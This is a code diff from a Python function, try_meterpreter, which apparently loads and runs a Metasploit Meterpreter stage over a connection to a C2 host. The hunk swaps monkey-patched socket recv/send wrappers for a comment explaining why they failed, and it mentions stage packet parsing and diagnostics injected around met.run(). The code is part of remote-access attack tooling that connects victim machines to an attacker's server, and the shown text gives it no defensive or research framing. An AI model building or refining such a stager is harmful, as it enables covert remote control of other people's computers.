@@ -469,53 +469,17 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
             except (OSError, AttributeError) as e:
                 log.warning("Socket hardening partial: %s", e)
 
-            # ── Socket monkey-patch: diagnostic recv wrapper ───
-            # v0.5.0 added MSG_WAITALL here, but that BREAKS the
-            # stage's first-packet detection (TcpTransport._get_packet
-            # checks `if first and len(packet) == 4` to detect a
-            # re-sent stage after transport reconnection — MSG_WAITALL
-            # forces recv(32) to always return 32 bytes, so the 4-byte
-            # stage-length is never seen alone, and the stage body is
-            # misread as a TLV header).  The stage already handles
-            # partial reads via `while len(rest) < pkt_length` loops,
-            # so MSG_WAITALL is redundant.  Keep the wrapper for
-            # diagnostic logging only.
-            _orig_recv = s.recv
-            _recv_count = [0]
-
-            def _diag_recv(bufsize, flags=0):
-                _recv_count[0] += 1
-                try:
-                    data = _orig_recv(bufsize, flags)
-                    if _recv_count[0] <= 20:
-                        log.debug("recv #%d: requested=%d got=%d",
-                                  _recv_count[0], bufsize,
-                                  len(data) if data else 0)
-                    return data
-                except Exception as e:
-                    log.warning("recv #%d error: %s", _recv_count[0], e)
-                    raise
-
-            s.recv = _diag_recv
-            log.info("Socket recv wrapped: diagnostic logging on "
-                     "first 20 recv calls (no MSG_WAITALL)")
-
-            # ── Socket monkey-patch: sendall for send ───────────
-            # MSF stage may use send() (partial) instead of sendall().
-            # Wrap send to retry on partial write.
-            _orig_send = s.send
-
-            def _full_send(data, flags=0):
-                total = 0
-                mv = memoryview(data)
-                while total < len(data):
-                    sent = _orig_send(mv[total:], flags)
-                    if sent <= 0:
-                        raise OSError("send returned %d" % sent)
-                    total += sent
-                return total
-
-            s.send = _full_send
+            # ── Socket note ────────────────────────────────────
+            # v0.5.0–0.5.1 tried to monkey-patch s.recv / s.send
+            # with diagnostic wrappers, but socket.socket is a C type
+            # whose method slots are read-only — the assignment raises
+            # "'socket' object attribute 'recv' is read-only".
+            # The stage already handles partial reads (while loops in
+            # _get_packet) and partial writes (sendall), so no wrapper
+            # is needed.  Diagnostic info comes from the source patches
+            # (DEBUGGING=True) and the diag injection around met.run().
+            log.info("Socket ready (no monkey-patch — C-level slots "
+                     "are read-only; stage handles partial I/O)")
 
             # ── Log stage source for diagnostics ────────────────
             _stage_text = (prepared.decode('latin-1', errors='replace')
